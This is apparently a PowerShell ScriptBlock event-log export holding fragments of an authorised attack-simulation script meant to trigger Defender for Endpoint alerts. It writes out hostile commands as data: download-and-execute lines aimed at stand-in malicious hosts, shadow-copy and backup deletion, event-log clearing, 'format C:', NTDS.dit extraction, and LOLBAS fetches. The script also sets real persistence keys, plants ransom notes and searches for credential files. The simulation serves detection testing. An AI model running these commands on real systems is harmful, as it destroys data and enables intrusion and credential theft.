    $rng.GetBytes($aesKey)
    $rng.GetBytes($aesIV)
    
    @{
        EncryptionMethod = ""AES-256-CBC""
        KeyFingerprint = [Convert]::ToBase64String($aesKey[0..7])
        IVFingerprint = [Convert]::ToBase64String($aesIV[0..7])
        Timestamp = Get-Date -Format ""o""
    } | ConvertTo-Json | Out-File ""$TargetPath\encrypted_channel.json""
}

# ============================================
# STAGE 8: Impact & Anti-Forensics
# ============================================
function Invoke-Stage8Impact {
    Write-MDELog ""=== STAGE 8: Impact & Anti-Forensics ==="" ""IMPACT"" -Technique ""T1486"" -Severity 5
    
    # T1486 - Data Encrypted for Impact (Ransomware Simulation)
    Write-MDELog ""Simulating ransomware behavior"" ""IMPACT"" -Technique ""T1486"" -Severity 5
    
    # Create ransomware indicators
    $ransomwareExtensions = @("".locked"", "".encrypted"", "".crypto"", "".enc"", "".WNCRY"")
    
    foreach ($ext in $ransomwareExtensions) {
        $markerFile = ""$TargetPath\test_file$ext""
        ""This file has been encrypted (SIMULATION)"" | Out-File $markerFile
        Write-MDELog ""Created ransomware marker: $markerFile"" ""IMPACT""
    }
    
    # Ransom note in multiple locations
    $ransomNote = @""
=== YOUR FILES HAVE BEEN ENCRYPTED ===
[SIMULATION ONLY - NO ACTUAL ENCRYPTION]

All your important files have been encrypted!
This is a controlled test of MDE ransomware detection.

Your unique ID: $script:AttackID
Bitcoin Address: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa

DO NOT PAY - THIS IS A SIMULATION
=== END OF SIMULATION ===
""@
    
    $ransomLocations = @(
        ""$env:USERPROFILE\Desktop\README_RANSOMWARE.txt"",
        ""$TargetPath\HOW_TO_DECRYPT.txt"",
        ""$env:TEMP\RESTORE_FILES.txt""
    )
    
    foreach ($location in $ransomLocations) {
        $ransomNote | Out-File $location -ErrorAction SilentlyContinue
    }
    
    # T1490 - Inhibit System Recovery
    Write-MDELog ""Simulating system recovery inhibition"" ""IMPACT"" -Technique ""T1490"" -Severity 5
    
    $recoveryCommands = @(
        ""vssadmin delete shadows /all /quiet"",
        ""wbadmin delete catalog -quiet"",
        ""bcdedit /set {default} recoveryenabled No"",
        ""bcdedit /set {default} bootstatuspolicy ignoreallfailures""
    )
    
    foreach ($cmd in $recoveryCommands) {
        Write-MDELog ""Recovery inhibition command (simulated): $cmd"" ""IMPACT""
        
        @{
            Command = $cmd
            Timestamp = Get-Date -Format ""o""
            Executed = $false
            Reason = ""Simulation only""
        } | ConvertTo-Json | Out-File ""$TargetPath\recovery_inhibit_$(Get-Random).json""
    }
    
    # T1070 - Indicator Removal
    Write-MDELog ""Simulating anti-forensic activities"" ""IMPACT"" -Technique ""T1070"" -Severity 4
    
    # T1070.001 - Clear Windows Event Logs
    $eventLogs = @(""Application"", ""Security"", ""System"", ""Microsoft-Windows-PowerShell/Operational"")
    
    foreach ($log in $eventLogs) {
        Write-MDELog ""Simulating event log clearing: $log"" ""IMPACT""
        
        @{
            LogName = $log
            Command = ""wevtutil cl $log""
            Timestamp = Get-Date -Format ""o""
            Status = ""Simulated""
        } | ConvertTo-Json | Out-File ""$TargetPath\log_clear_$($log -replace '[\\/]','_').json""
    }
    
    # T1070.004 - File Deletion
    Write-MDELog ""Simulating secure file deletion"" ""IMPACT"" -Technique ""T1070.004"" -Severity 3
    
    $deletionTools = @(
        @{Tool = ""sdelete""; Command = ""sdelete -p 3 -s -z C:\sensitive\""},
        @{Tool = ""cipher""; Command = ""cipher /w:C:\""},
        @{Tool = ""format""; Command = ""format C: /P:3""}
    )
    
    foreach ($tool in $deletionTools) {
        @{
            Tool = $tool.Tool
            Command = $tool.Command
            Timestamp = Get-Date -Format ""o""
            Status = ""Simulated""
        } | ConvertTo-Json | Out-File ""$TargetPath\secure_delete_$($tool.Tool).json""
    }
    
    # T1489 - Service Stop
    Write-MDELog ""Simulating critical service disruption"" ""IMPACT"" -Technique ""T1489"" -Severity 4
    
    $criticalServices = @(""WinDefend"", ""Sense"", ""VSS"", ""BITS"", ""wscsvc"")
    
    foreach ($service in $criticalServices) {
        $svc = Get-Service -Name $service -ErrorAction SilentlyContinue
        if ($svc) {
            Write-MDELog ""Target service for disruption: $service (Status: $($svc.Status))"" ""IMPACT""
        }
    }
}

# ============================================
# Generate Comprehensive MDE Alert Report
# ============================================
function Generate-MDEAlertReport {
    Write-MDELog ""Generating MDE Alert Correlation Report"" ""INFO""
    
    # Compile all alert triggers
    $alertReport = @{
        SimulationID = $script:AttackID
        Hostname = $env:COMPUTERNAME
        Domain = $env:USERDOMAIN
        Username = $env:USERNAME
        StartTime = $script:AttackStartTime
        EndTime = Get-Date -Format ""o""
        Duration = ((Get-Date) - $script:AttackStartTime).TotalMinutes
        
        ExpectedMDEAlerts = @{
            Critical = @(
                ""Suspicious PowerShell command line"",
                ""Process injection detected"",
                ""Credential dumping activity"",
                ""Ransomware behavior detected"",
                ""Security tool tampering""
            )
            High = @(
                ""WMI persistence detected"",
                ""Registry persistence created"",
                ""Scheduled task persistence"",
                ""LSASS process access"",
                ""Data exfiltration attempt""
            )
            Medium = @(
                ""Suspicious network activity"",
                ""File and directory discovery"",
                ""System information discovery"",
                ""Archive file creation"",
                ""DNS tunneling detected""
            )

ScriptBlock ID: 7079c0a7-864c-4409-8206-1982720c61a3
Path: C:\Simulation_Scripts\MDE_Attack_Simulation.ps1"
"07-08-2025 18:27:33","4104","Warning","Creating Scriptblock text (2 of 4):

    
    try {
        $wscriptShell = New-Object -ComObject WScript.Shell
        $shortcutPath = ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\MDETest.lnk""
        
        $shortcut = $wscriptShell.CreateShortcut($shortcutPath)
        $shortcut.TargetPath = ""powershell.exe""
        $shortcut.Arguments = ""-NoProfile -WindowStyle Hidden -Command Write-Host 'MDE Test'""
        $shortcut.Save()
        Write-MDELog ""Malicious shortcut created in Startup folder"" ""PERSIST""
        
        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($wscriptShell) | Out-Null
    } catch {
        Write-MDELog ""Failed to create shortcut: $_"" ""INFO""
    }
    
    # T1137 - Office Application Startup
    Write-MDELog ""Simulating Office persistence"" ""PERSIST"" -Technique ""T1137"" -Severity 3
    
    $officeStartup = @{
        WordStartup = ""$env:APPDATA\Microsoft\Word\STARTUP""
        ExcelStartup = ""$env:APPDATA\Microsoft\Excel\XLSTART""
        OutlookVBA = ""$env:APPDATA\Microsoft\Outlook\VbaProject.OTM""
    }
    
    foreach ($path in $officeStartup.Values) {
        $parentPath = Split-Path $path
        if (-not (Test-Path $parentPath)) { 
            New-Item -Path $parentPath -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
        }
        
        ""Sub AutoOpen()`n    MsgBox `""MDE Test`""`nEnd Sub"" | Out-File ""$path.bas"" -ErrorAction SilentlyContinue
    }
}

# ============================================
# STAGE 3: Advanced Defense Evasion & Credential Access
# ============================================
function Invoke-Stage3AdvancedEvasion {
    Write-MDELog ""=== STAGE 3: Advanced Defense Evasion & Credential Access ==="" ""EVASION"" -Technique ""T1562"" -Severity 5
    
    # T1562.001 - Impair Defenses: Disable or Modify Tools
    Write-MDELog ""Attempting to enumerate security tools"" ""EVASION"" -Technique ""T1562.001"" -Severity 5
    
    $securityProcesses = @(
        ""MsMpEng"", ""NisSrv"", ""Sense"", ""WinDefend"",
        ""MpCmdRun"", ""SecurityHealthService"", ""WDAVSERVICE""
    )
    
    foreach ($proc in $securityProcesses) {
        $process = Get-Process -Name $proc -ErrorAction SilentlyContinue
        if ($process) {
            @{
                ProcessName = $proc
                ProcessId = $process.Id
                StartTime = $process.StartTime
                WorkingSet = $process.WorkingSet
                Modules = ($process.Modules | Select-Object -First 5).ModuleName
            } | ConvertTo-Json | Out-File ""$TargetPath\security_enum_$proc.json""
            
            Write-MDELog ""Enumerated security process: $proc (PID: $($process.Id))"" ""EVASION""
        }
    }
    
    # T1564.003 - Hidden Window
    Write-MDELog ""Executing with hidden windows"" ""EVASION"" -Technique ""T1564.003"" -Severity 3
    
    $hiddenExecution = Start-Process powershell.exe -ArgumentList ""-WindowStyle Hidden -Command `""Start-Sleep -Seconds 2`"""" -PassThru -WindowStyle Hidden
    Write-MDELog ""Hidden process started: PID $($hiddenExecution.Id)"" ""EVASION""
    
    # T1027.010 - Command Obfuscation
    Write-MDELog ""Testing command obfuscation techniques"" ""EVASION"" -Technique ""T1027.010"" -Severity 4
    
    $obfuscationSamples = @(
        'p^o^w^e^r^s^h^e^l^l -e^n^c JABhAD0AJwB0AGUAcwB0ACcA',
        'cmd /c ""p""""o""""w""""e""""r""""s""""h""""e""""l""""l""',
        ""poWeRsHeLl -NoPrO`FiLe -ExEcUtIoNpOlIcY BypAsS"",
        'c""m""d /c p""o""w""e""r""s""h""e""l""l'
    )
    
    foreach ($obfuscated in $obfuscationSamples) {
        Write-MDELog ""Obfuscation pattern: $obfuscated"" ""EVASION""
        @{
            Pattern = $obfuscated
            Timestamp = Get-Date -Format ""o""
        } | ConvertTo-Json | Out-File ""$TargetPath\obfuscation_$(Get-Random).json""
    }
    
    # T1003.001 - LSASS Memory Credential Dumping Simulation
    Write-MDELog ""Simulating credential access attempts"" ""ATTACK"" -Technique ""T1003.001"" -Severity 5
    
    # Get LSASS process info without actually touching it
    $lsass = Get-Process lsass -ErrorAction SilentlyContinue
    if ($lsass) {
        Write-MDELog ""LSASS enumeration: PID $($lsass.Id)"" ""ATTACK""
        
        # Create mimikatz-style indicators
        $mimikatzIndicators = @{
            Technique = ""T1003.001""
            Target = ""lsass.exe""
            TargetPID = $lsass.Id
            Method = ""MiniDumpWriteDump""
            DumpSize = ""64MB""
            Timestamp = Get-Date -Format ""o""
            AttackID = $script:AttackID
        }
        
        $mimikatzIndicators | ConvertTo-Json | Out-File ""$TargetPath\credential_dump_attempt.json""
        
        # Create fake mimikatz output
        $mimikatzOutput = @""
  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  ""A La Vie, A L'Amour"" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
[SIMULATION - NO ACTUAL CREDENTIAL DUMPING]
Authentication Id : 0 ; 999999 (00000000:000f423f)
Session           : RemoteInteractive from 2
User Name         : TestUser
Domain            : $env:USERDOMAIN
Logon Server      : $env:COMPUTERNAME
Logon Time        : $(Get-Date -Format ""yyyy/MM/dd HH:mm:ss"")
SID               : S-1-5-21-1234567890-1234567890-1234567890-1001
""@
        $mimikatzOutput | Out-File ""$TargetPath\mimikatz_simulation_advanced.log""
    }
    
    # T1003.003 - NTDS.dit simulation
    Write-MDELog ""Simulating NTDS.dit access attempt"" ""ATTACK"" -Technique ""T1003.003"" -Severity 5
    
    $ntdsSimulation = @{
        Technique = ""T1003.003""
        Method = ""vssadmin.exe""
        Commands = @(
            ""vssadmin create shadow /for=C:"",
            ""copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit"",
            ""reg save HKLM\SYSTEM system.hiv""
        )
        Timestamp = Get-Date -Format ""o""
    }
    $ntdsSimulation | ConvertTo-Json | Out-File ""$TargetPath\ntds_access_attempt.json""
    
    # T1055.004 - Asynchronous Procedure Call injection
    Write-MDELog ""Simulating APC injection"" ""ATTACK"" -Technique ""T1055.004"" -Severity 4
    
    $apcInjection = @{
        Technique = ""T1055.004""
        Method = ""QueueUserAPC""
        TargetProcess = ""explorer.exe""
        TargetThreads = 4
        PayloadSize = 4096
    }
    $apcInjection | ConvertTo-Json | Out-File ""$TargetPath\apc_injection.json""
    
    # T1218 - Living off the Land Binaries
    Write-MDELog ""Testing LOLBAS execution"" ""EVASION"" -Technique ""T1218"" -Severity 4
    
    $lolbas = @(
        @{Binary = ""rundll32.exe""; Args = ""javascript:`""\..\mshtml,RunHTMLApplication `"";alert('test');""},
        @{Binary = ""regsvr32.exe""; Args = ""/s /n /u /i:http://test.com/file.sct scrobj.dll""},
        @{Binary = ""mshta.exe""; Args = ""javascript:alert('test');close();""},
        @{Binary = ""certutil.exe""; Args = ""-urlcache -split -f http://test.com/file.txt output.txt""}
    )
    
    foreach ($lol in $lolbas) {
        Write-MDELog ""LOLBAS simulation: $($lol.Binary)"" ""EVASION""
        @{
            Binary = $lol.Binary
            Arguments = $lol.Args
            Timestamp = Get-Date -Format ""o""
        } | ConvertTo-Json | Out-File ""$TargetPath\lolbas_$($lol.Binary.Replace('.exe','')).json""
    }
}

# ============================================
# STAGE 4: Advanced Discovery & Reconnaissance
# ============================================
function Invoke-Stage4AdvancedDiscovery {
    Write-MDELog ""=== STAGE 4: Advanced Discovery & Reconnaissance ==="" ""RECON"" -Technique ""T1087"" -Severity 3
    
    # T1087 - Account Discovery
    Write-MDELog ""Performing comprehensive account discovery"" ""RECON"" -Technique ""T1087"" -Severity 3
    
    $accountDiscovery = @{
        LocalUsers = @()
        DomainUsers = @()
        ServiceAccounts = @()
        PrivilegedAccounts = @()
    }
    
    # Enumerate local accounts
    Get-LocalUser | ForEach-Object {
        $accountDiscovery.LocalUsers += @{
            Name = $_.Name
            Enabled = $_.Enabled
            LastLogon = $_.LastLogon
            PasswordRequired = $_.PasswordRequired
            SID = $_.SID.Value
        }
    }
    
    # Enumerate domain accounts (simulation)
    try {
        $domainQuery = ""net user /domain""
        $accountDiscovery.DomainQuery = $domainQuery
    } catch {}
    
    $accountDiscovery | ConvertTo-Json -Depth 3 | Out-File ""$TargetPath\account_discovery_advanced.json""
    
    # T1083 - File and Directory Discovery with sensitive file search
    Write-MDELog ""Searching for sensitive files"" ""RECON"" -Technique ""T1083"" -Severity 4
    
    $sensitivePatterns = @(
        ""*.kdbx"", ""*.key"", ""*.pem"", ""*.pfx"", ""*.p12"",
        ""*password*"", ""*secret*"", ""*confidential*"",
        ""*.config"", ""web.config"", ""*.xml"", ""*.json""
    )
    
    $searchResults = @()
    foreach ($pattern in $sensitivePatterns) {
        $files = Get-ChildItem -Path $env:USERPROFILE -Filter $pattern -Recurse -ErrorAction SilentlyContinue | 
                 Select-Object -First 5
        
        if ($files) {
            $searchResults += @{
                Pattern = $pattern
                FilesFound = $files.FullName
                Count = $files.Count
            }
        }
    }
    
    $searchResults | ConvertTo-Json | Out-File ""$TargetPath\sensitive_file_discovery.json""
    Write-MDELog ""Sensitive file patterns searched: $($sensitivePatterns.Count)"" ""RECON""
    
    # T1069 - Permission Groups Discovery
    Write-MDELog ""Enumerating privileged groups"" ""RECON"" -Technique ""T1069"" -Severity 3
    
    $privilegedGroups = @(
        ""Administrators"",
        ""Domain Admins"",
        ""Enterprise Admins"",
        ""Schema Admins"",
        ""Backup Operators"",
        ""Server Operators"",
        ""Account Operators"",
        ""Print Operators""
    )
    
    $groupMembership = @{}
    foreach ($group in $privilegedGroups) {
        try {
            $members = Get-LocalGroupMember -Group $group -ErrorAction SilentlyContinue
            if ($members) {
                $groupMembership[$group] = $members.Name
                Write-MDELog ""Enumerated group: $group (Members: $($members.Count))"" ""RECON""
            }
        } catch {}
    }
    
    $groupMembership | ConvertTo-Json | Out-File ""$TargetPath\privileged_groups.json""
    
    # T1016 - System Network Configuration Discovery
    Write-MDELog ""Performing network configuration discovery"" ""RECON"" -Technique ""T1016"" -Severity 2
    
    $networkConfig = @{
        Interfaces = Get-NetAdapter | Select-Object Name, Status, MacAddress, LinkSpeed
        IPConfig = Get-NetIPAddress | Select-Object IPAddress, PrefixLength, InterfaceAlias
        Routes = Get-NetRoute | Select-Object DestinationPrefix, NextHop, InterfaceAlias | Select-Object -First 10
        DNSServers = Get-DnsClientServerAddress | Select-Object InterfaceAlias, ServerAddresses
        ARPCache = Get-NetNeighbor | Select-Object IPAddress, LinkLayerAddress, State | Select-Object -First 20
        Connections = Get-NetTCPConnection | Where-Object State -eq 'Established' | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort | Select-Object -First 20
    }
    
    $networkConfig | ConvertTo-Json -Depth 3 | Out-File ""$TargetPath\network_configuration.json""
    
    # T1007 - System Service Discovery
    Write-MDELog ""Discovering system services"" ""RECON"" -Technique ""T1007"" -Severity 2
    
    $suspiciousServices = Get-Service | Where-Object {
        $_.ServiceName -notlike ""Microsoft*"" -and 
        $_.ServiceName -notlike ""Windows*"" -and
        $_.Status -eq 'Running'
    } | Select-Object -First 20
    
    $suspiciousServices | Select-Object Name, DisplayName, Status, StartType | 
        ConvertTo-Json | Out-File ""$TargetPath\service_discovery.json""
    
    # T1012 - Query Registry
    Write-MDELog ""Querying sensitive registry locations"" ""RECON"" -Technique ""T1012"" -Severity 3
    
    $sensitiveRegKeys = @(
        ""HKLM:\SYSTEM\CurrentControlSet\Services\W32Time\Parameters"",
        ""HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"",
        ""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"",
        ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"",
        ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings""
    )
    
    foreach ($key in $sensitiveRegKeys) {
        if (Test-Path $key) {
            Get-ItemProperty -Path $key -ErrorAction SilentlyContinue | 
                ConvertTo-Json | Out-File ""$TargetPath\registry_$(($key -replace '[:\\]','_')).json""
        }
    }
}

# ============================================
# STAGE 5: Lateral Movement Preparation
# ============================================
function Invoke-Stage5LateralMovement {
    Write-MDELog ""=== STAGE 5: Lateral Movement Preparation ==="" ""ATTACK"" -Technique ""T1021"" -Severity 4
    
    # T1021.002 - SMB/Windows Admin Shares
    Write-MDELog ""Testing SMB lateral movement vectors"" ""ATTACK"" -Technique ""T1021.002"" -Severity 4
    
    $smbTargets = @(""\\localhost\C$"", ""\\127.0.0.1\ADMIN$"", ""\\$env:COMPUTERNAME\IPC$"")
    
    foreach ($target in $smbTargets) {
        Write-MDELog ""Testing SMB access: $target"" ""ATTACK""
        
        # Just test if path exists, don't actually access
        $testResult = Test-Path $target -ErrorAction SilentlyContinue
        
        @{
            Target = $target
            Accessible = $testResult
            Timestamp = Get-Date -Format ""o""
            Technique = ""T1021.002""
        } | ConvertTo-Json | Out-File ""$TargetPath\smb_test_$(Get-Random).json""
    }
    
    # T1021.006 - Windows Remote Management
    Write-MDELog ""Testing WinRM capabilities"" ""ATTACK"" -Technique ""T1021.006"" -Severity 3
    
    $winrmTest = @{
        Service = ""Not Running""
        Listeners = ""Configuration check simulated""
        TrustedHosts = """"
    }
    
    try {
        $winrmService = Get-Service WinRM -ErrorAction SilentlyContinue
        if ($winrmService) {
            $winrmTest.Service = $winrmService.Status
        }
        
        $trustedHosts = Get-Item WSMan:\localhost\Client\TrustedHosts -ErrorAction SilentlyContinue
        if (

ScriptBlock ID: 7079c0a7-864c-4409-8206-1982720c61a3
Path: C:\Simulation_Scripts\MDE_Attack_Simulation.ps1"
"07-08-2025 18:27:33","4104","Warning","Creating Scriptblock text (1 of 4):
#Requires -RunAsAdministrator
<#
.SYNOPSIS
    Advanced Multi-Stage Attack Simulation v3.0 for MDE Alert Generation
.DESCRIPTION
    Sophisticated attack simulation designed to trigger comprehensive MDE alerts
    in security.microsoft.com portal with enhanced detection coverage.
    FOR AUTHORIZED SECURITY TESTING ONLY IN CONTROLLED ENVIRONMENTS.
.AUTHOR
    Sameer P Sheik - Enhanced Version 3.0
.VERSION
    3.0 - Advanced MDE Alert Generation with Futuristic Attack Patterns
#>

param(
    [switch]$SafeMode = $true,
    [string]$TargetPath = ""$env:TEMP\MDEAdvancedTest_$(Get-Date -Format 'yyyyMMddHHmmss')"",
    [switch]$SkipCleanup = $false,
    [switch]$MaximumAlerts = $false,
    [int]$DelayBetweenStages = 3,
    [switch]$GenerateHighSeverity = $true
)

# Global variables for MDE tracking
$script:MDEAlertTriggers = @()
$script:AttackID = [Guid]::NewGuid().ToString()
$script:HostIdentifier = ""$env:COMPUTERNAME-$env:USERDOMAIN""

# Enhanced safety check with MDE awareness
if ($SafeMode) {
    Write-Host ""??????????????????????????????????????????????????????????????????"" -ForegroundColor Yellow
    Write-Host ""?         ADVANCED MDE ATTACK SIMULATION v3.0                   ?"" -ForegroundColor Yellow
    Write-Host ""?     This will trigger REAL alerts in security.microsoft.com   ?"" -ForegroundColor Yellow
    Write-Host ""?              FOR AUTHORIZED TESTING ONLY                      ?"" -ForegroundColor Yellow
    Write-Host ""??????????????????????????????????????????????????????????????????"" -ForegroundColor Yellow
    Write-Host ""`nHost: $script:HostIdentifier"" -ForegroundColor Cyan
    Write-Host ""Attack ID: $script:AttackID"" -ForegroundColor Cyan
    
    $response = Read-Host ""`nThis simulation will generate multiple MDE alerts. Continue? (yes/no)""
    if ($response -ne ""yes"") { 
        Write-Host ""Simulation cancelled."" -ForegroundColor Red
        exit 
    }
}

# Initialize advanced logging with MDE correlation
$script:LogPath = ""$TargetPath\AdvancedSimulation_$script:AttackID.log""
$script:MDECorrelationLog = ""$TargetPath\MDE_Correlation_$script:AttackID.json""
New-Item -Path $TargetPath -ItemType Directory -Force | Out-Null

function Write-MDELog {
    param(
        [string]$Message,
        [string]$Type = ""INFO"",
        [string]$Technique = """",
        [int]$Severity = 1
    )
    
    $timestamp = Get-Date -Format ""yyyy-MM-dd HH:mm:ss.fff""
    $logEntry = ""[$timestamp] [$Type] [SEV:$Severity] $Message""
    Add-Content -Path $script:LogPath -Value $logEntry
    
    # Track MDE alert triggers
    if ($Technique) {
        $script:MDEAlertTriggers += @{
            Timestamp = $timestamp
            Technique = $Technique
            Message = $Message
            Severity = $Severity
            HostName = $env:COMPUTERNAME
            AttackID = $script:AttackID
        }
    }
    
    # Console output with color coding
    switch($Type) {
        ""CRITICAL"" { Write-Host $logEntry -ForegroundColor Red }
        ""ATTACK"" { Write-Host $logEntry -ForegroundColor Magenta }
        ""PERSIST"" { Write-Host $logEntry -ForegroundColor Yellow }
        ""EXFIL"" { Write-Host $logEntry -ForegroundColor DarkMagenta }
        ""RECON"" { Write-Host $logEntry -ForegroundColor Cyan }
        ""EVASION"" { Write-Host $logEntry -ForegroundColor DarkYellow }
        ""IMPACT"" { Write-Host $logEntry -ForegroundColor DarkRed }
        default { Write-Host $logEntry }
    }
}

# ============================================
# STAGE 0: Pre-Attack Setup & MDE Beacon
# ============================================
function Invoke-Stage0Setup {
    Write-MDELog ""=== STAGE 0: Pre-Attack Setup & MDE Detection Primer ==="" ""INFO""
    
    # Generate unique attack fingerprint for MDE correlation
    $attackFingerprint = @{
        AttackID = $script:AttackID
        Hostname = $env:COMPUTERNAME
        Domain = $env:USERDOMAIN
        Username = $env:USERNAME
        StartTime = Get-Date -Format ""o""
        SimulationVersion = ""3.0""
        MDEAgent = (Get-Service -Name ""WinDefend"" -ErrorAction SilentlyContinue).Status
        SenseService = (Get-Service -Name ""Sense"" -ErrorAction SilentlyContinue).Status
    }
    
    $attackFingerprint | ConvertTo-Json | Out-File ""$TargetPath\attack_fingerprint.json""
    
    # Trigger initial MDE visibility
    Write-MDELog ""Establishing MDE visibility beacon"" ""INFO""
    
    # Create a suspicious but benign marker for MDE
    $markerPath = ""$env:TEMP\mde_test_marker_$script:AttackID.txt""
    ""MDE Attack Simulation Active - ID: $script:AttackID"" | Out-File $markerPath
    
    # Generate initial suspicious but safe network activity
    $testDomains = @(
        ""test-mde-simulation.local"",
        ""attack-simulation-v3.test""
    )
    
    foreach ($domain in $testDomains) {
        nslookup $domain 2>&1 | Out-Null
    }
    
    Write-MDELog ""MDE detection primer completed"" ""INFO""
}

# ============================================
# STAGE 1: Advanced Initial Access & Execution
# ============================================
function Invoke-Stage1AdvancedAccess {
    Write-MDELog ""=== STAGE 1: Advanced Initial Access & Execution ==="" ""ATTACK"" -Technique ""T1059.001"" -Severity 3
    
    # T1059.001 - Advanced PowerShell Execution with AMSI Bypass Simulation
    Write-MDELog ""Executing advanced PowerShell techniques"" ""ATTACK"" -Technique ""T1059.001"" -Severity 4
    
    # Multiple PowerShell execution methods to trigger MDE
    $executionMethods = @(
        @{
            Method = ""EncodedCommand""
            Command = 'IEX (New-Object Net.WebClient).DownloadString(""http://fake-malware-site.com/payload.ps1"")'
        },
        @{
            Method = ""InvokeExpression""
            Command = 'Invoke-Expression ""Write-Host Simulated-Payload""'
        },
        @{
            Method = ""ScriptBlock""
            Command = '& {Write-Host ""Suspicious ScriptBlock Execution""}'
        }
    )
    
    foreach ($method in $executionMethods) {
        Write-MDELog ""Testing execution method: $($method.Method)"" ""ATTACK""
        
        if ($method.Method -eq ""EncodedCommand"") {
            $encodedCmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($method.Command))
            $psArgs = ""-NoProfile -EncodedCommand $encodedCmd""
            Start-Process powershell.exe -ArgumentList $psArgs -WindowStyle Hidden -Wait
        }
        
        # Log for MDE correlation
        @{
            Timestamp = Get-Date -Format ""o""
            ExecutionMethod = $method.Method
            Encoded = ($method.Method -eq ""EncodedCommand"")
        } | ConvertTo-Json | Out-File ""$TargetPath\ps_execution_$($method.Method).json""
        
        Start-Sleep -Milliseconds 500
    }
    
    # T1055 - Advanced Process Injection Indicators
    Write-MDELog ""Simulating advanced process injection"" ""ATTACK"" -Technique ""T1055"" -Severity 5
    
    # Create multiple injection indicators for different techniques
    $injectionTechniques = @(
        @{
            Technique = ""T1055.001""
            Name = ""DLL Injection""
            Target = ""explorer.exe""
            Method = ""SetWindowsHookEx""
        },
        @{
            Technique = ""T1055.002""
            Name = ""PE Injection""
            Target = ""svchost.exe""
            Method = ""CreateRemoteThread""
        },
        @{
            Technique = ""T1055.003""
            Name = ""Thread Hijacking""
            Target = ""notepad.exe""
            Method = ""SetThreadContext""
        },
        @{
            Technique = ""T1055.012""
            Name = ""Process Hollowing""
            Target = ""rundll32.exe""
            Method = ""NtUnmapViewOfSection""
        }
    )
    
    foreach ($injection in $injectionTechniques) {
        Write-MDELog ""Injection technique: $($injection.Name) -> $($injection.Target)"" ""ATTACK""
        
        $injectionMarker = @{
            Timestamp = Get-Date -Format ""o""
            Technique = $injection.Technique
            InjectionType = $injection.Name
            TargetProcess = $injection.Target
            Method = $injection.Method
            SourcePID = $PID
            AttackID = $script:AttackID
        }
        
        $injectionMarker | ConvertTo-Json | Out-File ""$TargetPath\injection_$($injection.Technique).json""
    }
    
    # T1106 - Native API calls simulation
    Write-MDELog ""Simulating Native API usage"" ""ATTACK"" -Technique ""T1106"" -Severity 4
    
    # Use Add-Type to simulate suspicious API usage
    try {
        $apiCode = @""
using System;
using System.Runtime.InteropServices;
public class SuspiciousAPI {
    [DllImport(""kernel32.dll"")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport(""kernel32.dll"")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
}
""@
        
        if (-not ([System.Management.Automation.PSTypeName]'SuspiciousAPI').Type) {
            Add-Type -TypeDefinition $apiCode -Language CSharp -ErrorAction SilentlyContinue
        }
    } catch {
        Write-MDELog ""API simulation type already exists or failed to load"" ""INFO""
    }
    
    # T1140 - Deobfuscate/Decode Files
    Write-MDELog ""Creating obfuscated payloads"" ""ATTACK"" -Technique ""T1140"" -Severity 3
    
    # Create base64 encoded suspicious content
    $suspiciousContent = @""
powershell.exe -nop -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')""
""@
    
    $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($suspiciousContent))
    $encoded | Out-File ""$TargetPath\encoded_payload.txt""
    
    # Decode it to trigger MDE
    $decoded = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encoded))
    $decoded | Out-File ""$TargetPath\decoded_payload.ps1""
    
    # T1027 - Obfuscated Files or Information
    Write-MDELog ""Generating obfuscated artifacts"" ""ATTACK"" -Technique ""T1027"" -Severity 3
    
    # Create XOR encrypted file
    $xorKey = 0x42
    $originalData = ""Sensitive Data for Exfiltration""
    $xorData = $originalData.ToCharArray() | ForEach-Object { [char]([byte]$_ -bxor $xorKey) }
    -join $xorData | Out-File ""$TargetPath\xor_encrypted.dat""
}

# ============================================
# STAGE 2: Sophisticated Persistence Mechanisms
# ============================================
function Invoke-Stage2SophisticatedPersistence {
    Write-MDELog ""=== STAGE 2: Sophisticated Persistence Mechanisms ==="" ""PERSIST"" -Technique ""T1547"" -Severity 4
    
    # T1547.001 - Registry Run Keys with multiple locations
    Write-MDELog ""Establishing multi-vector registry persistence"" ""PERSIST"" -Technique ""T1547.001"" -Severity 4
    
    $persistenceLocations = @(
        ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"",
        ""HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"",
        ""HKCU:\Environment"",
        ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders""
    )
    
    foreach ($location in $persistenceLocations) {
        try {
            if ($location -match ""Environment"") {
                Set-ItemProperty -Path $location -Name ""MDE_TEST_$script:AttackID"" -Value ""cmd.exe /c echo test"" -ErrorAction SilentlyContinue
            } else {
                Set-ItemProperty -Path $location -Name ""MDESimulation_$($script:AttackID.Substring(0,8))"" -Value ""powershell.exe -NoProfile -WindowStyle Hidden -Command Write-Host Test"" -ErrorAction SilentlyContinue
            }
            Write-MDELog ""Persistence added to: $location"" ""PERSIST""
        } catch {}
    }
    
    # T1053.005 - Scheduled Task with multiple triggers
